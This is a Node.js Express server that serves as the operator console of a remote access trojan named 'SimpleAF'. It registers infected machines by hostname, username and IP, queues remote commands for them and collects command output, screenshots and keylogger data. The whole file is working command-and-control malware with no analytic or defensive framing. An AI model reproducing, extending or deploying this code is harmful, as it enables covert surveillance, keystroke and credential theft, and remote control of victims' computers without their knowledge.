const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');
const app = express();
const server = http.createServer(app);

const clients = new Map();
const clientResults = new Map();
const keylogs = new Map();

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Client registration
app.post('/register', (req, res) => {
    const { key, hostname, username, pid, ip } = req.body;
    clients.set(key, {
        hostname,
        username,
        pid,
        ip: ip || req.socket.remoteAddress || 'Unknown',
        lastSeen: Date.now(),
        connected: true
    });
    console.log(`\n[+] CLIENT CONNECTED`);
    console.log(`    Key: ${key}`);
    console.log(`    Host: ${hostname}`);
    console.log(`    User: ${username}`);
    console.log(`    IP: ${ip || 'Unknown'}`);
    console.log(`    Time: ${new Date().toLocaleString()}\n`);
    res.json({ status: 'ok' });
});

// Get pending command
app.get('/command/:key', (req, res) => {
    const key = req.params.key;
    const client = clients.get(key);
    
    if (client && client.pendingCommand) {
        const cmd = client.pendingCommand;
        delete client.pendingCommand;
        res.json(cmd);
    } else {
        res.json({ action: 'none' });
    }
});

// Receive command result
app.post('/result/:key', (req, res) => {
    const key = req.params.key;
    const { result } = req.body;
    
    if (!clientResults.has(key)) {
        clientResults.set(key, []);
    }
    clientResults.get(key).push(result);
    res.json({ status: 'ok' });
});

// Receive screenshot
app.post('/screenshot/:key', (req, res) => {
    const key = req.params.key;
    const { image } = req.body;
    
    const timestamp = Date.now();
    const safeKey = String(key).replace(/[^A-Za-z0-9_-]/g, "");
    const filename = `screenshot_${safeKey}_${timestamp}.png`;
    const filepath = path.join(__dirname, 'public', 'screenshots', filename);
    
    if (!fs.existsSync(path.join(__dirname, 'public', 'screenshots'))) {
        fs.mkdirSync(path.join(__dirname, 'public', 'screenshots'), { recursive: true });
    }
    
    fs.writeFileSync(filepath, image, 'base64');
    
    if (!clientResults.has(key)) {
        clientResults.set(key, []);
    }
    clientResults.get(key).push(`SCREENSHOT: /screenshots/${filename}`);
    res.json({ status: 'ok' });
});

// Receive keylog data
app.post('/keylog/:key', (req, res) => {
    const key = req.params.key;
    const { keys } = req.body;
    
    if (!keylogs.has(key)) {
        keylogs.set(key, '');
    }
    keylogs.set(key, keylogs.get(key) + keys);
    res.json({ status: 'ok' });
});

// Get keylog data
app.get('/keylog/:key', (req, res) => {
    const key = req.params.key;
    const log = keylogs.get(key) || '';
    keylogs.set(key, '');
    res.json({ log });
});

// Send command to client
app.post('/send/:key', (req, res) => {
    const key = req.params.key;
    const { action, params } = req.body;
    
    const client = clients.get(key);
    if (!client) {
        return res.status(404).json({ error: 'Client not found' });
    }
    
    client.pendingCommand = { action, params };
    console.log(`[+] Command: ${action} ${params || ''} -> ${key}`);
    res.json({ status: 'ok' });
});

// Get results
app.get('/results/:key', (req, res) => {
    const key = req.params.key;
    const results = clientResults.get(key) || [];
    clientResults.set(key, []);
    res.json({ results });
});

// List clients
app.get('/clients', (req, res) => {
    const list = Array.from(clients.entries()).map(([key, data]) => ({
        key,
        hostname: data.hostname,
        username: data.username,
        ip: data.ip,
        lastSeen: data.lastSeen
    }));
    res.json(list);
});

const PORT = process.env.PORT || 3307;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] SimpleAF operator console listening on port ${PORT}`);
    console.log(`[+] Open http://localhost:${PORT} in a browser`);
});
